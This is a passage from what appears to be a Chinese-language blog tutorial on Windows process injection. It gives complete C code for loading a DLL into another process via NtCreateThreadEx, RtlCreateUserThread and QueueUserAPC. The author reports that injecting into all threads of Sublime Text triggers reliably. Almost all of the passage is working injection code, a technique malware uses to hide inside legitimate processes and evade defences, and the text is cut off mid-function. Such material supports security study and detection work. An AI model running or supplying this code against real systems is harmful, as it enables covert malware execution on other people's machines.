 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h4><p>这是一个未公开的API，需要自己定义函数结构体：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> LPFUN_NtCreateThreadEx<span class="token punctuation">)</span> 
<span class="token punctuation">(</span>
 PHANDLE hThread<span class="token punctuation">,</span>
 ACCESS_MASK DesiredAccess<span class="token punctuation">,</span>
 LPVOID ObjectAttributes<span class="token punctuation">,</span>
 HANDLE ProcessHandle<span class="token punctuation">,</span>
 LPTHREAD_START_ROUTINE lpStartAddress<span class="token punctuation">,</span>
 LPVOID lpParameter<span class="token punctuation">,</span>
 BOOL CreateSuspended<span class="token punctuation">,</span>
 ULONG StackZeroBits<span class="token punctuation">,</span>
 ULONG SizeOfStackCommit<span class="token punctuation">,</span>
 ULONG SizeOfStackReserve<span class="token punctuation">,</span>
 LPVOID lpBytesBuffer
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注入原理和CreateRemoteThread类似，也是通过创建远程线程：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span>


<span class="token keyword">void</span> <span class="token function">demoNtCreateThreadEx</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 HANDLE hRemoteThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
 DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 打开进程</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 开辟内存</span>
 LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 写入内存</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 获取LoadLibraryA函数地址</span>
 PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 获取NtCreateThreadEx函数地址</span>
 PROC pfnNtCreateThreadEx <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtCreateThreadEx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnNtCreateThreadEx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get NtCreateThreadEx Address failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 LPFUN_NtCreateThreadEx funNtCreateThreadEx <span class="token operator">=</span> <span class="token punctuation">(</span>LPFUN_NtCreateThreadEx<span class="token punctuation">)</span>pfnNtCreateThreadEx<span class="token punctuation">;</span>
 NTSTATUS status <span class="token operator">=</span> <span class="token function">funNtCreateThreadEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hRemoteThread<span class="token punctuation">,</span> <span class="token number">0x1FFFFF</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>PTHREAD_START_ROUTINE<span class="token punctuation">)</span>pfnProcAddr<span class="token punctuation">,</span>
  pszDllAddr<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call NtCreateThreadEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by NtCreateThreadEx success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="RtlCreateUserThread"><a href="#RtlCreateUserThread" class="headerlink" title="RtlCreateUserThread"></a>RtlCreateUserThread</h4><p>对NtCreateThreadEx函数的封装，也是未公开的API。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token function">DWORD</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> LPFUN_RtlCreateUserThread<span class="token punctuation">)</span>
<span class="token punctuation">(</span>
 IN HANDLE 					ProcessHandle<span class="token punctuation">,</span>
 IN PSECURITY_DESCRIPTOR 	SecurityDescriptor<span class="token punctuation">,</span>
 IN BOOL 					CreateSuspended<span class="token punctuation">,</span>
 IN ULONG					StackZeroBits<span class="token punctuation">,</span>
 IN OUT PULONG				StackReserved<span class="token punctuation">,</span>
 IN OUT PULONG				StackCommit<span class="token punctuation">,</span>
 IN LPVOID					StartAddress<span class="token punctuation">,</span>
 IN LPVOID					StartParameter<span class="token punctuation">,</span>
 OUT HANDLE 					ThreadHandle<span class="token punctuation">,</span>
 OUT LPVOID					ClientID
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span>


<span class="token keyword">void</span> <span class="token function">demoRtlCreateUserThread</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 HANDLE hRemoteThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
 DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 打开进程</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 开辟内存</span>
 LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 写入内存</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 获取LoadLibraryA函数地址</span>
 PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 PROC pfnRtlCreateUserThread <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"RtlCreateUserThread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnRtlCreateUserThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get pfnRtlCreateUserThread Address failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 LPFUN_RtlCreateUserThread funRtlCreateUserThread <span class="token operator">=</span> <span class="token punctuation">(</span>LPFUN_RtlCreateUserThread<span class="token punctuation">)</span>pfnRtlCreateUserThread<span class="token punctuation">;</span>
 DWORD status <span class="token operator">=</span> <span class="token function">funRtlCreateUserThread</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 
  pfnProcAddr<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hRemoteThread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>status<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call RtlCreateUserThread failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by RtlCreateUserThread success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-2-线程劫持"><a href="#2-2-线程劫持" class="headerlink" title="2.2 线程劫持"></a>2.2 线程劫持</h3><h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>通过添加线程的APC队列，使得线程被再次执行时会调用APC队列中的函数。并不是每个线程都会被执行，在注入时可以向目标进程的所有线程中都注入一次，我测试的是Sublime_Text，注入所有线程后可以稳定触发。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tlhelp32.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span>


<span class="token keyword">void</span> <span class="token function">demoQueueUserAPC</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 打开进程</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 开辟内存</span>
 LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 写入内存</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 获取LoadLibraryA函数地址</span>
 PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>

 <span class="token comment">// 遍历线程</span>
 HANDLE h <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPTHREAD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Couldn't create snapshot.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 THREADENTRY32 te<span class="token punctuation">;</span>
 te<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>te<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Thread32First</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token operator">&amp;</span>te<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Couldn't get first thread.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 DWORD dwThreadId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Thread32Next</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token operator">&amp;</span>te<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>te<span class="token punctuation">.</span>th32OwnerProcessID <span class="token operator">==</span> dwPid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   dwThreadId <span class="token operator">=</span> te<span class="token punctuation">.</span>th32ThreadID<span class="token punctuation">;</span>
   HANDLE hThread <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span>THREAD_SET_CONTEXT<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Couldn't open thread %d.\n"</span><span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   DWORD status <span class="token operator">=</span> <span class="token function">QueueUserAPC</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PAPCFUNC<span class="token punctuation">)</span>pfnProcAddr<span class="token punctuation">,</span> hThread<span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pszDllAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call QueueUserAPC Failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by QueueUserAPC success in thread %d!\n"</span><span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
